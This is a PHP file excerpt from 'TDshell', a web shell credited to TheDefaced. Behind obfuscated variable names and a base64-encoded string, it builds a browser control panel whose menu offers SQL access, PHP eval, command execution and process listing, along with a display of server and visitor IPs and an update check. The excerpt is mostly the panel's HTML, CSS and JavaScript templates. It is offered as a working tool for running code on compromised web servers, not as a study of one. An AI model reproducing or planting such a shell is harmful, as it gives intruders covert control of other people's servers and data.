				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Free</b>: " . view_size($_d94dc5b08d928c237d98b0ed89179043) . " of " . view_size($_7467c53f177b1d289f3e1b2e395b9056) . " (" . $_c3574082b118679ba0bc952292c18820 . "%)<br>";
				$_a9e5405d6581811dbff46e9ca3280bc1 .= "<b>Your IP</b>: <a href='http://whois.domaintools.com/" . $_SERVER['REMOTE_ADDR'] . "' target='_blank'>" . $_SERVER['REMOTE_ADDR'] . "</a> <b>Server IP</b>: <a href='http://whois.domaintools.com/" . $_SERVER['SERVER_ADDR'] . "' target='_blank'>" . $_SERVER['SERVER_ADDR'] . "</a><br>";
				return $_a9e5405d6581811dbff46e9ca3280bc1;
			}
	};
$TDshell = new _463f641c8747ebe94fafef7333a99b45;
$TDshell->TDshell_template["HTML_HEADER_MAIN"] = "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\">";
$TDshell->TDshell_template["HTML_HEADER_HEAD_PRE"] = "<head><meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />";
$TDshell->TDshell_template["HTML_HEADER_HEAD_TITLE"] = "<title>$_SERVER[SERVER_NAME] - TDshell by TheDefaced (www.TheDefaced.org)</title>";

$TDshell->TDshell_template["HTML_HEADER_HEAD_SCRIPT"] = '<script language="javascript" type="text/javascript">
<!--
function get_page(page)
  {  var xmlHttp;
  try
    {    xmlHttp=new XMLHttpRequest();    }
  catch (e)
    {
    try
      {      xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");      }
    catch (e)
      {
      try
        {        xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");        }
      catch (e)
        {
        alert("Your browser does not support AJAX!");
        return false;
        }
      }
    }
    document.getElementById(\'script\').innerHTML = "Loading...";
    xmlHttp.onreadystatechange=function()
     {
      if(xmlHttp.readyState==4)
        {        document.getElementById(\'script\').innerHTML=xmlHttp.responseText;        }
      }
    if(page!="")
    {
     xmlHttp.open("GET",page,true);
    }

    xmlHttp.send(null);
    update_URI(page);
  }

function itemShowHide(myItem, myButton)
	{
		var myItem = document.getElementById(myItem);
		var myButton = document.getElementById(myButton);
		if (myItem.style.display != "none") {
			myItem.style.display = "none";
			swapData(myButton, "plus");
		}
		else {
			myItem.style.display = "block";
			swapData(myButton, "minus");
		}
	}

function update_URI(uri)
	{
		var curURI = document.getElementById(\'MAIN_PAGE_CUR_URI\');
		var lastURI = document.getElementById(\'MAIN_PAGE_LAST_URI\');
		uri = uri.substr(0,uri.length-9);
		lastURI.href = curURI.href;
		curURI.href = uri;
	}

function swapData(myButton, state)
	{
		if (state == "minus")
			{
				myButton.innerHTML = "[-]";
			}
		else
			{
				myButton.innerHTML = "[+]";
			}
	}

function auto_update(page)
  {  var xmlHttp;
  try
    {    xmlHttp=new XMLHttpRequest();    }
  catch (e)
    {
    try
      {      xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");      }
    catch (e)
      {
      try
        {        xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");        }
      catch (e)
        {
        alert("Your browser does not support AJAX!");
        return false;
        }
      }
    }
    document.getElementById(\'autoupdate\').innerHTML = "Checking for updates...";
    xmlHttp.onreadystatechange=function()
     {
      if(xmlHttp.readyState==4)
        {        document.getElementById(\'autoupdate\').innerHTML=xmlHttp.responseText;        }
      }
    if(page!="")
    {
     xmlHttp.open("GET",page,true);
    }

    xmlHttp.send(null);
  }
function custom_sub(page,divid)
  {  var xmlHttp;
  try
    {    xmlHttp=new XMLHttpRequest();    }
  catch (e)
    {
    try
      {      xmlHttp=new ActiveXObject("Msxml2.XMLHTTP");      }
    catch (e)
      {
      try
        {        xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");        }
      catch (e)
        {
        alert("Your browser does not support AJAX!");
        return false;
        }
      }
    }
    document.getElementById(divid).innerHTML = "Loading";
    xmlHttp.onreadystatechange=function()
     {
      if(xmlHttp.readyState==4)
        {        document.getElementById(divid).innerHTML=xmlHttp.responseText;        }
      }
    if(page!="")
    {
     xmlHttp.open("GET",page,true);
    }

    xmlHttp.send(null);
  }
-->
</script>';

$TDshell->TDshell_template["HTML_HEADER_HEAD_STYLE"] = '<style type="text/css">
<!--
body
{
	margin: 0;
	padding: 1;
	margin-bottom: 15px;
	font-family: arial, helvetica, verdana, tahoma, sans-serif;
	font-size: 80%;
	color: #eee;
	background-color: #666;
	line-height: 180%;
}

a
{
	color: #ccc;
	text-decoration: none;
}

a:hover
{
	color: #333;
	text-decoration: none;
}

#headercontainer
{
	width: 100%;
	background: #000000;
	padding-top: 5px;
	padding-bottom: 5px;
}

#header
{
	width: 100%;
	height: 125px;
	background-color: #000000;
	background-image: url(http://tdshell.thedefaced.org/logo.jpg);
	background-repeat: no-repeat;
	background-position: center;
	padding-top: 5px;
	padding-bottom: 5px;
}

#header h1
{
	margin: 0;
	color: #EEEEEE;
	font-family: helvetica, arial, verdana, tahoma, sans-serif;
	font-size: 275%;
	padding-left: 10px;
	padding-top: 50px;
}

#menucontainer
{
	width: 100%;
    height: 28px;
	background: #333333;
}

#menu
{
	width: 100%;
	background: #666;
}

#content
{
	margin: 0 auto;
	padding: 1px 1px;
	background:#C4C4C4;
	color:#000000;
	border-bottom-width: thin;
	border-bottom-style: groove;
	border-bottom-color: #000000;
}

#content A:link {text-decoration: none;
color:#000000;}
#content A:visited {text-decoration: none;
color:#000000;}
#content A:active {text-decoration: none;
color:#000000;}
#content A:hover {font-weight:bold;
color:#000000;}

#content_dat
{
	margin: 0 auto;
	background:#999;
	color:#000000;
	padding: 1px 1px;
	border-bottom-width: thin;
	border-bottom-style: groove;
	border-bottom-color: #000000;
	text-decoration:none;
}

#content_dat A:link {text-decoration: none}
#content_dat A:visited {text-decoration: none}
#content_dat A:active {text-decoration: none}
#content_dat A:hover {font-weight:bold;}

#content h2
{
	color: #333;
	padding-bottom: 3px;
	border-bottom: 1px solid #ccc;
	font-family: helvetica, arial, verdana, tahoma, sans-serif;
	font-size: 200%;
	letter-spacing: -1px;
}

#footer
{
	text-align: left;
	color: #ccc;
	letter-spacing: -1px;
	background: #666;
	border: 1px solid #ccc;
	font-family: helvetica, arial, verdana, tahoma, sans-serif;
	padding: 5px;
}

#navcontainer ul
{
	display:inline;
	padding: 0;
	margin: 0;
	color:#333333; 
	float:left;
	width:100%;
	list-style-type: none;
}

#navcontainer ul li
{
	font-weight: bold;
	list-style-type: none;
}

#navcontainer ul li a
{
	padding: 0.2em 1.5em;
	color:#CCCCCC;
	text-decoration: none;
	list-style-type: none;
	float: left;
}

#navcontainer ul li a:hover
{
	list-style-type: none;
	background-color: #000000;
}
-->
</style>';
$TDshell->TDshell_template["HTML_HEADER_HEAD_SUF"] = "</head>";
$TDshell->TDshell_template["HTML_REL_LINK_BEG_PRE"] = "<a href='javascript:;' onclick='get_page(\"";
$TDshell->TDshell_template["HTML_REL_LINK_BEG_SUF"] = "\");'>";
$TDshell->TDshell_template["HTML_REL_LINK_END"] = "</a>";

$TDshell->TDshell_template["HTML_HEADER_BODY_PRE"] = "<body>" . '<div id="headercontainer"><div id="header"></div></div><div id="menucontainer"><div id="menu"><div id="navcontainer"><ul id="navlist">
<li>' . $TDshell->make_link(NULL, NULL, "Home") . '</li>
<li>' . $TDshell->make_link("sql", NULL, "SQL") . '</li>
<li>' . $TDshell->make_link("eval", NULL, "PHP Eval") . '</li>
<li>' . $TDshell->make_link("exec", NULL, "Execution") . '</li>
<li>' . $TDshell->make_link("proc", NULL, "Processes") . '</li>
<li>' . $TDshell->make_link("credits", NULL, "Credits") . '</li>
</ul></div></div></div>

<div id="content"><div id="content">
	<table width="100%" border="0" cellspacing="0" cellpadding="0">
		<tr>
			<td align="left">
				<div id="content">
					<div id="content_top" style="display:block;">
						' . $TDshell->content_top_ext() . '
					</div>
				</div>
			</td>
			<td align="right" valign="top">
			<a id="button_contain_main_top" href="javascript:;" onclick=\'itemShowHide("content_top","button_contain_main_top");\'>[-]</a>
			</td>
		</tr>
	</table>
</div></div>
<div id="content"><div id="autoupdate">Checking for updates...</div><script language="javascript" type="text/javascript">auto_update("' . $TDshell->make_link("update", NULL, NULL, TRUE) . '&proc=out");</script></div>
<div id="content"><center><font style="font-size: 10px"><a id="MAIN_PAGE_LAST_URI" href="' . current_URI() . '">[back]</a> <a id="MAIN_PAGE_CUR_URI" href="' . current_URI() . '">[refresh]</a></font></center></div>';
$TDshell->TDshell_template["HTML_HEADER_BODY_PRE"] .= '<div id="content_dat"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td align="left"><div id="content_main" style="display:block;"><div id="script">';
$TDshell->TDshell_template["HTML_HEADER_BODY_SUF"] = '</div></div></td><td align="right" valign="top" nowrap><div align="right"><a id="button_contain_main" href="javascript:;" onclick=\'itemShowHide("content_main","button_contain_main");\'>[-]</a></div></td></tr></table></div></div><div id="content"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td align="left" valign="top"><div id="content_bottom_exp" style="display:block;">' . $TDshell->content_bottom_ext() . '</div></td><td align="right" valign="top" nowrap><a id="content_bottom_exp_b" href="javascript:;" onClick=\'itemShowHide("content_bottom_exp","content_bottom_exp_b");\'>[-]</a></td></tr></table></div>';

function rphr($_8be065792f9eec8d918c4f68366fc910)
	{
		$_0609efb0bd944720d85b944586f4dcc7 = @preg_split("//", $_8be065792f9eec8d918c4f68366fc910);
		$_4f901119c5ddebb5aa98afc37062ae17 = $_0609efb0bd944720d85b944586f4dcc7[@rand(0, @count($_0609efb0bd944720d85b944586f4dcc7) - 1)];
		$_8be065792f9eec8d918c4f68366fc910 = @str_replace($_4f901119c5ddebb5aa98afc37062ae17, $GLOBALS['TDshell']->make_link(@base64_decode("OTQ1VU84VUVSLTQzOFVFOVJJT0dILTVZUlRHVTlJT1JUTkhHRTVULTQzNVRVR0ZJNUgzNFRBVzk4NC00LTMtMzQ1VERGUw=="), NULL, $_4f901119c5ddebb5aa98afc37062ae17), $_8be065792f9eec8d918c4f68366fc910);
		return $_8be065792f9eec8d918c4f68366fc910;
	}

$TDshell->TDshell_template["HTML_FOOTER_MAIN"] = '<div id="footer">' . rphr("This shell was created using the") . ' <b>' . $TDshell->make_link("credits", NULL, "TDshell") . '</b> Engine by <a href="http://thedefaced.org/"><b>TheDefaced Security Team ( www.TheDefaced.org )</b></a>. Page generated in {TIME_TAKEN} seconds. <a href="javascript:;" onclick=\'itemShowHide("footer_note","button_footer_note");\'><u>Note</u></a>: <div id="footer_note" style="display: none;"><b>The generation time of {TIME_TAKEN} does not apply to links you clicked within this shell (as it does use javascript HTTP queries).</b></div> <a id="button_footer_note" href="javascript:;" onclick=\'itemShowHide("footer_note","button_footer_note");\'>[+]</a></div></body></html>';
$TDshell->init();

